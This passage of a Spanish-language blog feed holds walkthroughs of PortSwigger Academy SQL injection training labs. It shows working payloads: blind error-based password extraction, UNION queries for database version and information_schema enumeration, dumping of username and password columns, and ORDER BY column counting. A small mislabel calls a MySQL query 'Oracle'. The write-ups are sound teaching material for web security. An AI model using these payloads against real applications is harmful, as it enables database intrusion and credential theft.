		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/payloads.png&#34;
			width=&#34;784&#34;
			height=&#34;278&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/payloads_hu3826db709bb7e645db59686da8152161_11835_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/payloads_hu3826db709bb7e645db59686da8152161_11835_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Ataque con intruder&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Ataque con intruder&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;recuperar-la-contrasena&#34;&gt;Recuperar la contrasena&lt;/h4&gt;
&lt;p&gt;Ahora que sabemos el tamano ya podemos enviar la peticion para recuperarla, ahora para recuperar la contrasena utilizaremos la siguiente consulta para inyectar:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;xxxxx&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; AND (SELECT CASE WHEN ((select SUBSTR(password, 1, 1) from users where username=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;administrator&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;)=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;) THEN to_char(1/0) ELSE &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; END FROM dual)=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ahora vamos a realizar un ataque de clusterbomb enviando en el primer parametro el valor que cambiara de 1 a 20 y en el segundo un caracter alfanumerico.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 201; 
			flex-basis: 483px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/clusterbomb.png&#34; data-size=&#34;1140x566&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/clusterbomb.png&#34;
			width=&#34;1140&#34;
			height=&#34;566&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/clusterbomb_hu06f5bcfe4a95f0b61d1ee23c79eba140_74895_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/clusterbomb_hu06f5bcfe4a95f0b61d1ee23c79eba140_74895_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Ataque de cluster bomb&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Ataque de cluster bomb&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y al terminar el ataque podemos notar que los que dan un error 500 del lado servidor son donde la condicion fue true y toca tomar toda esa informacion para formar la contrasena:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 186; 
			flex-basis: 446px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/ataque.png&#34; data-size=&#34;771x414&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/ataque.png&#34;
			width=&#34;771&#34;
			height=&#34;414&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/ataque_hu285ec21bee2f135b85cb64b0006de933_18437_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/ataque_hu285ec21bee2f135b85cb64b0006de933_18437_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Resoyestas del ataque con error de respuesta 500&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Resoyestas del ataque con error de respuesta 500&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Al finalizar y formar la contrasena seria &lt;code&gt;gt4dyzmn4weyzcdog1n1&lt;/code&gt; y podemos iniciar sesion en la aplicacion para completar el laboratorio&lt;/p&gt;
&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 206; 
			flex-basis: 494px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/resuelto.png&#34; data-size=&#34;1786x866&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/resuelto.png&#34;
			width=&#34;1786&#34;
			height=&#34;866&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/resuelto_huf13eac2c8bbf1e3d9abbc64039f0280d_94807_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/resuelto_huf13eac2c8bbf1e3d9abbc64039f0280d_94807_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 8</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/</link>
        <pubDate>Sat, 06 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 8" /&gt;&lt;h1 id=&#34;lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft&#34;&gt;Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer la version de la base de datos MySQL o Microsoft SQL Server y poder imprimir en las tablas que se presentan. La string que deberiamos de recuperar es &lt;code&gt;8.0.27&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Algo a notar en las consultas al hacer union en MySQL es que al agregar un comentario se debe de agregar un espacio, como ejemplo &lt;code&gt;union select null-- &lt;/code&gt; notese el espacio al final para que el sistema pueda comentar correctamente, en otros gestores no es necesario esto pero MySQL si.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Algo a tomar en cuenta es que al hacer la solicitud por medio del navegador si se agrega solamente un espacio este no aceptara correctamente la consulta por alguna razon por lo que habria que agregar un &lt;code&gt;-&lt;/code&gt; para inyectar correctamente la consulta y contrario por medio de &lt;code&gt;repeater en burpsuite&lt;/code&gt; si se puede agregar solo el espacio y sigue mostrando correctamente sin dar un error de servidor.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;h4 id=&#34;detectar-columnas&#34;&gt;Detectar columnas&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 1-- -
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Gifts&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;-- -
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 3-- - //Muestra error
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;detectar-string&#34;&gt;Detectar string&lt;/h3&gt;
&lt;p&gt;Por lo que se ve al imprimir datos es que las dos columnas recuperan datos string, no es necesario hacer la prueba pero siempre hacerlo cuando se dude.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;recuperar-version&#34;&gt;Recuperar version&lt;/h3&gt;
&lt;p&gt;Ahora recuperar la version, las consultas utilizadas para esto en &lt;code&gt;Oracle&lt;/code&gt; son las siguientes:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select @@version,null-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 92; 
			flex-basis: 221px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/resuelto.png&#34; data-size=&#34;1763x1908&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/resuelto.png&#34;
			width=&#34;1763&#34;
			height=&#34;1908&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/resuelto_hub5b3c9914d9ed653fe39f1d753b7a134_540914_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/resuelto_hub5b3c9914d9ed653fe39f1d753b7a134_540914_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 9</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/</link>
        <pubDate>Sat, 06 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 9" /&gt;&lt;h1 id=&#34;lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases&#34;&gt;Lab: SQL injection attack, listing the database contents on non-Oracle databases&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer datos de la base de datos, basandose en inyectar consultas para tomarlos, al final se resuelve el laboratorio iniciando sesion con el usuario &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Algo a notar en las consultas al hacer union en MySQL es que al agregar un comentario se debe de agregar un espacio, como ejemplo &lt;code&gt;union select null-- &lt;/code&gt; notese el espacio al final para que el sistema pueda comentar correctamente, en otros gestores no es necesario esto pero MySQL si.&lt;/p&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;h4 id=&#34;detectar-columnas&#34;&gt;Detectar columnas&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 1-- -
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Gifts&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;-- -
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 3-- - //Muestra error
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;detectar-string&#34;&gt;Detectar string&lt;/h3&gt;
&lt;p&gt;Por lo que se ve al imprimir datos es que las dos columnas recuperan datos string, no es necesario hacer la prueba pero siempre hacerlo cuando se dude.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;recuperar-tablas&#34;&gt;Recuperar tablas&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,table_name fRoM information_schema.tables-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 93; 
			flex-basis: 225px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/dbs.png&#34; data-size=&#34;1794x1909&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/dbs.png&#34;
			width=&#34;1794&#34;
			height=&#34;1909&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/dbs_hucc0bf64a2a09ae2df1872684eefc6b74_207558_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/dbs_hucc0bf64a2a09ae2df1872684eefc6b74_207558_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Listado de Tablas&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Listado de Tablas&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;recuperar-nombres-de-columnas-de-la-tabla-users_fcqnpf&#34;&gt;Recuperar nombres de columnas de la tabla &lt;code&gt;users_fcqnpf&lt;/code&gt;&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,column_name fRoM information_schema.columns wHeRe table_name=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users_fcqnpf&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 105; 
			flex-basis: 254px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/columns.png&#34; data-size=&#34;1754x1657&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/columns.png&#34;
			width=&#34;1754&#34;
			height=&#34;1657&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/columns_hu05f43e8ed173b7b9daeb78008c2a0a46_529229_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/columns_hu05f43e8ed173b7b9daeb78008c2a0a46_529229_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Listado de columnas de la tabla users_fcqnpf&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Listado de columnas de la tabla users_fcqnpf&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;recuperar-datos&#34;&gt;Recuperar Datos&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select username_nrukiy,password_ebqikr from users_fcqnpf-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 185; 
			flex-basis: 444px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/datos.png&#34; data-size=&#34;1749x944&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/datos.png&#34;
			width=&#34;1749&#34;
			height=&#34;944&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/datos_hu337d3c0c1cac383618b2cc03e4479db4_207061_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/datos_hu337d3c0c1cac383618b2cc03e4479db4_207061_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Usuarios y Contrasenas extraidos&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Usuarios y Contrasenas extraidos&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 247; 
			flex-basis: 594px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/resuelto.png&#34; data-size=&#34;1783x720&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/resuelto.png&#34;
			width=&#34;1783&#34;
			height=&#34;720&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/resuelto_hueac367ce4a8d9a70f297c76badbefdad_60651_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/resuelto_hueac367ce4a8d9a70f297c76badbefdad_60651_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 3</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/</link>
        <pubDate>Thu, 04 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 3" /&gt;&lt;h1 id=&#34;lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query&#34;&gt;Lab: SQL injection UNION attack, determining the number of columns returned by the query&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es recuperar el numero de columnas de la tabla a la que se esta realizando la consulta, para posteriormente poder extraer los datos basandose en ese numero de columnas. Para este caso se puede hacer uso de dos metodos que pueden ser &lt;code&gt;ORDER BY ?&lt;/code&gt; o &lt;code&gt;UNION SELECT NULL,NULL,NULL...&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Usando algunos de estos dos podemos recuperar el numero de columnas, sabiendo que a la hora que la aplicacion genere un error no sera el numero de columna correcta, claramente si usamos un &lt;code&gt;order by 9&lt;/code&gt; y secuencialmente llegamos hasta el 10 quiere decir que esa tabla cuenta con 9 columnas y son las que utilizaremos posteriormente para imprimir los datos.&lt;/p&gt;
&lt;p&gt;Union select null funciona igualmente, si agregamos 9 null y al agregar un null mas nos muestra error quiere decir que esa tabla solo cuenta con 9 columnas. Un ejemplo de uso en una consulta sql seria:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tabla&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nombre&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tabla&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nombre&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
